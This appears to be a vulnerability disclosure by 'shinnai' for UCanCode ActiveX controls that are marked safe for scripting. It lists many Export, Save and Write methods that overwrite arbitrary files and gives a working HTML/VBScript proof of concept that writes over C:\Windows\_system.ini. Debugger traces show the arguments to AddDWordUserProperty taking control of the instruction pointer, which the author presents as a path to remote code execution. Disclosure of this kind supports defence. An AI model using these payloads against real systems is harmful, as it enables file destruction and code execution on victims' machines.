@@ -1,0 +1,329 @@
+UCanCode multiple vulnerabilities
+
+Url: http://www.hmi-software.com/
+     http://www.ucancode.net/index.htm
+     http://www.ucancode.net/bbs/zhuce/login.htm
+
+Description: Form vendor's web page "UCanCode Software is a Market Leading provider of HMI & SCADA, CAD, UML, GIS, Vector Graphics
+             and Real Time Data Visualization Graphics Source Code Kits for C/C++ and .NET software developers more than 40 countries
+             around the world!"
+             Great... 40 countries. It's time to take a look to their software!
+             Package name "UCanCode_Controls.zip"
+             After the installation, we can found these activex controls:
+			 
+             ---------------------------------------------
+             ProgID: UCCVIEWER.UCCViewerCtrl.1
+             CLSID: {3B7B3C36-8515-4E15-BC46-D1BEBA2F360C}
+             ---------------------------------------------
+             ProgID: UCCDRAW.UCCDrawCtrl.1
+             CLSID: {4B5BEE59-EDD2-4082-A9F7-D65E1CA20FA7}
+             ---------------------------------------------
+             progID: TKDRAWCAD.TKDrawCADCtrl.1
+             CLSID: {9022B790-B810-45B4-80BC-2D94EEC5343C}
+             ---------------------------------------------
+             ProgID: UCCPRINT.UCCPrintCtrl.1
+             CLSID: {A4FCBD44-6BF5-405C-9598-C8E8ADCE4488}
+             ---------------------------------------------
+             ProgID: UCCDIAGRAM.UCCDiagramCtrl.1
+             CLSID: {B6A3BF2C-F770-4182-BE7F-103BF2C76826}
+             ---------------------------------------------
+             ProgID: UCCUML.UCCUMLCtrl.1
+             CLSID: {C1F0EE85-363F-483D-97D0-87E2A537BFBA}
+             ---------------------------------------------
+             ProgID: UCCHMI.UCCHMICtrl.1
+             CLSID: {EDBBC1DC-58B2-4404-85FD-F9B1C05D96EF}
+             ---------------------------------------------
+             ProgID: UCCSIMPLE.UCCSIMPLECtrl.1
+             CLSID: {EF3AAE34-E60A-11E1-9656-00FF8A2F9C5B}
+             ---------------------------------------------
+             and all are marked as: RegKey Safe for Script: True
+                                    RegKey Safe for Init: True
+                                    Implements IObjectSafety: False
+
+Author: shinnai
+mail: shinnai[at]autistici[dot]org
+site: http://www.shinnai.altervista.org/
+---------------------------------------------------------------------
+INSECURE METHODS:
+In these coontrols there are a lot of insecure methods which can be used to overwrite
+arbitrary files in user's pc. This is the complete list:
+
+1) various Export* methods
+
+Library: UCCSIMPLELib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCSIM~1.OCX
+Class: UCCSIMPLE  {EF3AAE34-E60A-11E1-9656-00FF8A2F9C5B}
+Sub ExportAsBitmapFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCSIMPLELib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCSIM~1.OCX
+Class: UCCSIMPLE  {EF3AAE34-E60A-11E1-9656-00FF8A2F9C5B}
+Sub ExportAsEMFFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCHMILib - C:\PROGRA~1\UCANCO~1\UCANCO~1\HMI_OCX\UCCHMI.ocx
+Class: UCCHMI  {EDBBC1DC-58B2-4404-85FD-F9B1C05D96EF}
+Sub ExportAsBitmapFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCHMILib - C:\PROGRA~1\UCANCO~1\UCANCO~1\HMI_OCX\UCCHMI.ocx
+Class: UCCHMI  {EDBBC1DC-58B2-4404-85FD-F9B1C05D96EF}
+Sub ExportAsEMFFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCUMLLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCUML.ocx
+Class: UCCUML  {C1F0EE85-363F-483D-97D0-87E2A537BFBA}
+Sub ExportAsBitmapFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCUMLLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCUML.ocx
+Class: UCCUML  {C1F0EE85-363F-483D-97D0-87E2A537BFBA}
+Sub ExportAsEMFFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCUMLLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCUML.ocx
+Class: UCCUML  {C1F0EE85-363F-483D-97D0-87E2A537BFBA}
+Function ExportBitmapData (ByRef phBlob  As Long, ByVal imageShape  As Long) As Boolean
+----------------------------------------
+Library: UCCDIAGRAMLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDIA~1.OCX
+Class: UCCDiagram  {B6A3BF2C-F770-4182-BE7F-103BF2C76826}
+Sub ExportAsBitmapFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCDIAGRAMLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDIA~1.OCX
+Class: UCCDiagram  {B6A3BF2C-F770-4182-BE7F-103BF2C76826}
+Sub ExportAsEMFFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCPRINTLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCPrint.ocx
+Class: UCCPrint  {A4FCBD44-6BF5-405C-9598-C8E8ADCE4488}
+Sub ExportAsBitmapFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCPRINTLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCPrint.ocx
+Class: UCCPrint  {A4FCBD44-6BF5-405C-9598-C8E8ADCE4488}
+Sub ExportAsEMFFile (ByVal strFile  As String)
+----------------------------------------
+Library: TKDRAWCADLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\TKDRAW~1.OCX
+Class: TKDrawCAD  {9022B790-B810-45B4-80BC-2D94EEC5343C}
+Sub ExportAsBitmapFile (ByVal strFile  As String)
+----------------------------------------
+Library: TKDRAWCADLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\TKDRAW~1.OCX
+Class: TKDrawCAD  {9022B790-B810-45B4-80BC-2D94EEC5343C}
+Sub ExportAsEMFFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCDRAWLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDraw.ocx
+Class: UCCDraw  {4B5BEE59-EDD2-4082-A9F7-D65E1CA20FA7}
+Sub ExportAsBitmapFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCDRAWLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDraw.ocx
+Class: UCCDraw  {4B5BEE59-EDD2-4082-A9F7-D65E1CA20FA7}
+Sub ExportAsEMFFile (ByVal strFile  As String)
+----------------------------------------
+Library: UCCDRAWLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDraw.ocx
+Class: UCCDraw  {4B5BEE59-EDD2-4082-A9F7-D65E1CA20FA7}
+Function ExportToBitmapFile (ByVal lpszFile As String) As Boolean
+----------------------------------------
+Library: UCCVIEWERLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCVIE~1.OCX
+Class: UCCViewer  {3B7B3C36-8515-4E15-BC46-D1BEBA2F360C}
+Sub ExportAsBitmapFile (ByVal strFile As String)
+----------------------------------------
+Library: UCCVIEWERLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCVIE~1.OCX
+Class: UCCViewer  {3B7B3C36-8515-4E15-BC46-D1BEBA2F360C}
+Sub ExportAsEMFFile (ByVal strFile As String)
+----------------------------------------
+
+2) various Save* methods:
+
+----------------------------------------
+Library: UCCSIMPLELib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCSIM~1.OCX
+Class: UCCSIMPLE  {EF3AAE34-E60A-11E1-9656-00FF8A2F9C5B}
+Function SaveMemory2 (ByVal filename As String, ByVal pData As Long, ByVal nSize As Long) As Boolean
+----------------------------------------
+Library: UCCHMILib - C:\PROGRA~1\UCANCO~1\UCANCO~1\HMI_OCX\UCCHMI.ocx
+Class: UCCHMI  {EDBBC1DC-58B2-4404-85FD-F9B1C05D96EF}
+Function SaveMemory2 (ByVal filename As String, ByVal pData As Long, ByVal nSize As Long) As Boolean
+----------------------------------------
+Library: UCCUMLLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCUML.ocx
+Class: UCCUML  {C1F0EE85-363F-483D-97D0-87E2A537BFBA}
+Function SaveMemory2 (ByVal filename As String, ByVal pData As Long, ByVal nSize As Long) As Boolean
+----------------------------------------
+Library: UCCDIAGRAMLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDIA~1.OCX
+Class: UCCDiagram  {B6A3BF2C-F770-4182-BE7F-103BF2C76826}
+Function SaveMemory2 (ByVal filename As String , ByVal pData As Long , ByVal nSize As Long) As Boolean
+----------------------------------------
+Library: UCCDIAGRAMLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDIA~1.OCX
+Class: UCCDiagram  {B6A3BF2C-F770-4182-BE7F-103BF2C76826}
+Sub SaveToXdgFile (ByVal lpszFileName As String)
+----------------------------------------
+Library: UCCDIAGRAMLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDIA~1.OCX
+Class: UCCDiagram  {B6A3BF2C-F770-4182-BE7F-103BF2C76826}
+Function SaveTemplateToFile (ByVal strFile As String) As Boolean
+----------------------------------------
+Library: UCCPRINTLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCPrint.ocx
+Class: UCCPrint  {A4FCBD44-6BF5-405C-9598-C8E8ADCE4488}
+Function SaveMemory2 (ByVal filename As String , ByVal pData As Long , ByVal nSize As Long) As Boolean
+----------------------------------------
+Library: UCCPRINTLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCPrint.ocx
+Class: UCCPrint  {A4FCBD44-6BF5-405C-9598-C8E8ADCE4488}
+Sub SaveToXdgFile (ByVal lpszFileName As String)
+----------------------------------------
+Library: UCCPRINTLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCPrint.ocx
+Class: UCCPrint  {A4FCBD44-6BF5-405C-9598-C8E8ADCE4488}
+Function SaveTemplateToFile (ByVal strFile As String) As Boolean
+----------------------------------------
+Library: TKDRAWCADLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\TKDRAW~1.OCX
+Class: TKDrawCAD  {9022B790-B810-45B4-80BC-2D94EEC5343C}
+Function SaveMemory2 (ByVal filename As String , ByVal pData As Long , ByVal nSize As Long) As Boolean
+----------------------------------------
+Library: TKDRAWCADLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\TKDRAW~1.OCX
+Class: TKDrawCAD  {9022B790-B810-45B4-80BC-2D94EEC5343C}
+Sub SaveToXdgFile (ByVal lpszFileName As String)
+----------------------------------------
+Library: TKDRAWCADLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\TKDRAW~1.OCX
+Class: TKDrawCAD  {9022B790-B810-45B4-80BC-2D94EEC5343C}
+Function SaveTemplateToFile (ByVal strFile As String) As Boolean
+----------------------------------------
+Library: UCCDRAWLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDraw.ocx
+Class: UCCDraw  {4B5BEE59-EDD2-4082-A9F7-D65E1CA20FA7}
+Function SaveMemory2 (ByVal filename As String, ByVal pData As Long, ByVal nSize As Long) As Boolean
+----------------------------------------
+Library: UCCDRAWLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDraw.ocx
+Class: UCCDraw  {4B5BEE59-EDD2-4082-A9F7-D65E1CA20FA7}
+Function SaveDocument (ByVal lpszFileName As String) As Boolean
+----------------------------------------
+Library: UCCDRAWLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDraw.ocx
+Class: UCCDraw  {4B5BEE59-EDD2-4082-A9F7-D65E1CA20FA7}
+Sub SaveToXdgFile (ByVal lpszFileName As String)
+----------------------------------------
+Library: UCCVIEWERLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCVIE~1.OCX
+Class: UCCViewer  {3B7B3C36-8515-4E15-BC46-D1BEBA2F360C}
+Function SaveMemory2 (ByVal filename As String, ByVal pData As Long, ByVal nSize As Long) As Boolean
+----------------------------------------
+Library: UCCVIEWERLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCVIE~1.OCX
+Class: UCCViewer  {3B7B3C36-8515-4E15-BC46-D1BEBA2F360C}
+Sub SaveToXdgFile (ByVal lpszFileName As String)
+----------------------------------------
+Library: UCCVIEWERLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCVIE~1.OCX
+Class: UCCViewer  {3B7B3C36-8515-4E15-BC46-D1BEBA2F360C}
+Function SaveTemplateToFile (ByVal strFile As String) As Boolean
+----------------------------------------
+
+3) various Write methods:
+
+----------------------------------------
+Library: UCCSIMPLELib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCSIM~1.OCX
+Class: UCCSIMPLE  {EF3AAE34-E60A-11E1-9656-00FF8A2F9C5B}
+Function Write (ByVal lpszFileName As String) As Boolean
+----------------------------------------
+Library: UCCHMILib - C:\PROGRA~1\UCANCO~1\UCANCO~1\HMI_OCX\UCCHMI.ocx
+Class: UCCHMI  {EDBBC1DC-58B2-4404-85FD-F9B1C05D96EF}
+Function Write (ByVal lpszFileName As String) As Boolean
+----------------------------------------
+Library: UCCUMLLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCUML.ocx
+Class: UCCUML  {C1F0EE85-363F-483D-97D0-87E2A537BFBA}
+Function Write (ByVal lpszFileName As String) As Boolean
+----------------------------------------
+Library: UCCDIAGRAMLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDIA~1.OCX
+Class: UCCDiagram  {B6A3BF2C-F770-4182-BE7F-103BF2C76826}
+Function Write (ByVal lpszFileName As String) As Boolean
+----------------------------------------
+Library: UCCPRINTLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCPrint.ocx
+Class: UCCPrint  {A4FCBD44-6BF5-405C-9598-C8E8ADCE4488}
+Function Write (ByVal lpszFileName As String) As Boolean
+----------------------------------------
+Library: TKDRAWCADLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\TKDRAW~1.OCX
+Class: TKDrawCAD  {9022B790-B810-45B4-80BC-2D94EEC5343C}
+Function Write (ByVal lpszFileName As String) As Boolean
+----------------------------------------
+Library: UCCDRAWLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCDraw.ocx
+Class: UCCDraw  {4B5BEE59-EDD2-4082-A9F7-D65E1CA20FA7}
+Function Write (ByVal lpszFileName As String) As Boolean
+----------------------------------------
+Library: UCCVIEWERLib - C:\PROGRA~1\UCANCO~1\UCANCO~1\OCX_PR~1\UCCVIE~1.OCX
+Class: UCCViewer  {3B7B3C36-8515-4E15-BC46-D1BEBA2F360C}
+Function Write (ByVal lpszFileName As String) As Boolean
+----------------------------------------
+
+PROOF OF CONCEPT:
+<html>
+ <object classid="clsid:B6A3BF2C-F770-4182-BE7F-103BF2C76826" id="test"></object>
+  <script language = "vbscript">
+   test.SaveTemplateToFile buff,C:\Windows\_system.ini
+  </script>
+</html>
+
+----------------------------------------
+----------------------------------------
+
+REMOTE CODE EXECUTION
+
+This product is so poor coded that remote code execution is possible using a lot of functions (and I'm lazy),
+so here it is the description of just one of it, "AddDWordUserProperty":
+
+CPU Disasm
+Address   Hex dump          Command                                  Comments
+...
+...
+1007FEB5  |.  8D5424 44     LEA EDX,[LOCAL.36]
+1007FEB9  |.  51            PUSH ECX
+1007FEBA  |.  8B06          MOV EAX,DWORD PTR DS:[ESI] <- WE CAN CONTROL ESI
+1007FEBC  |.  52            PUSH EDX
+1007FEBD  |.  8BCE          MOV ECX,ESI
+1007FEBF  |.  C78424 DC0000 MOV DWORD PTR SS:[LOCAL.0],0
+1007FECA  |.  897C24 10     MOV DWORD PTR SS:[LOCAL.51],EDI
+1007FECE  |.  FF90 04030000 CALL DWORD PTR DS:[EAX+304]
+1007FED4  |.  85C0          TEST EAX,EAX
+...
+...
+Registers:
+CPU - thread 9. (00000B38), module UCCVIE~1_OCX
+EAX 015DD1D0
+ECX 015DD194
+EDX 015DD1D0
+EBX 00000000
+ESP 015DD188
+EBP 015DD300
+ESI 41414141 <- FIRST ARGUMENT PASSED TO AddDWordUserProperty METHOD
+EDI 42424242 <- SECOND ARGUMENT PASSED TO AddDWordUserProperty METHOD
+EIP 1007FEBA UCCVIE~1_OCX.1007FEBA
+
+----------------------------------------------------------------------
+
+We can use it to pass a valid memory address so that we can find a more comfortable situation :)
+CPU Disasm
+Address   Hex dump          Command                                  Comments
+...
+...
+1007FEB5  |.  8D5424 44     LEA EDX,[LOCAL.36]
+1007FEB9  |.  51            PUSH ECX
+1007FEBA  |.  8B06          MOV EAX,DWORD PTR DS:[ESI]
+1007FEBC  |.  52            PUSH EDX
+1007FEBD  |.  8BCE          MOV ECX,ESI
+1007FEBF  |.  C78424 DC0000 MOV DWORD PTR SS:[LOCAL.0],0
+1007FECA  |.  897C24 10     MOV DWORD PTR SS:[LOCAL.51],EDI
+1007FECE  |.  FF90 04030000 CALL DWORD PTR DS:[EAX+304] <- WE NOW ARE IN CONTROL OF EAX
+1007FED4  |.  85C0          TEST EAX,EAX
+...
+...
+
+Registers
+CPU - thread 9. (00000B38), module UCCVIE~1_OCX
+EAX 45454545 <- THIS VALUE THAT WAS PREVIOUSLY STORED IN MEMORY, IF WE CHANGE IT IN ANOTHER VALID ADDRESS...
+ECX 00030040 ASCII "EEEE"
+EDX 015DD1D0
+EBX 00000000
+ESP 015DD184
+EBP 015DD300
+ESI 00030040 ASCII "EEEE"
+EDI 42424242
+EIP 1007FECE UCCVIE~1_OCX.1007FECE
+And...
+CPU - thread 9. (00000B38)
+EAX 0002FDBC
+ECX 00030040 ASCII "EEEE"
+EDX 015DD1D0
+EBX 00000000
+ESP 015DD180
+EBP 015DD300
+ESI 00030040 ASCII "EEEE"
+EDI 42424242
+EIP 46464646 <- BINGO :)
+
+----------------------------------------
+----------------------------------------
+
+BONUS STAGE:
+There are a huge number of DoS... happy hunting :)
+Peace, your friendly neighborhood shinnai.
+---------------------------------------------------------------------
